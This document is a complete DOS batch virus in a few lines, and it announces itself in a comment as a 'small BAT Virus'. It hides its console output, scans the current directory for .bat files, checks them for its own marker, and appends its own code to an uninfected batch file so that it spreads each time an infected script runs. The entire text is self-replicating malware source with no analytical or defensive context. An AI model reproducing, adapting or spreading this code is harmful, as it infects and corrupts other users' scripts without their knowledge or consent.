@ctty nul
for %%i in (*.bat) do set _!!=%%i
for %%q in (*.bat) do find "_!!" %%q
if not errorlevel 1 goto dw
type %0 >> %_!!%
: Hi! I small BAT Virus!
:dw
